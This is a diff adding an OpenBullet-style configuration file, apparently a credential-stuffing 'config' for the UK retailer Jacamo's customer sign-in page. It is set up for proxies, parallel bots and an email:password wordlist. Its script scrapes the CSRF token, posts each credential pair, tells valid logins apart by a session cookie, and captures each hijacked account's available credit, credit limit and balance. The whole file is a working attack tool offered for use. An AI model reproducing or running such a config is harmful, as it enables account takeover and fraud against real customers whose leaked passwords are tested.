@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Jamaco",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-23T00:20:31.1366371+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.jacamo.co.uk/shop/signin/display.action" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "[name=csrfRandomFormToken]" "value" 0 -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.jacamo.co.uk/shop/signin/process.action" AutoRedirect=TRUE 
+  CONTENT "accountRefOrEmail=<USER>&password=<PASS>&__checkbox_rememberMe=true&csrfRandomFormToken=<TOKEN>&isMobileApp=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.jacamo.co.uk/shop/signin/display.action" 
+  HEADER "origin: https://www.jacamo.co.uk" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "strErrorMessage" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "SESSION_TIMEOUT_INFO" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "Available to spend" 
+PARSE "<SOURCE>" LR "accountDetail\">&pound;" "<" Recursive=FALSE -> CAP "AVAILABLE TO SPEND" "£" "" 
+PARSE "<SOURCE>" LR "creditLimitDetail\">&pound;" "<" Recursive=FALSE -> CAP "CRED LIMIT" "£" "" 
+PARSE "<SOURCE>" LR "currentBalanceDetail\">&pound;" "<" Recursive=FALSE -> CAP "BALANCE" "£" "" 
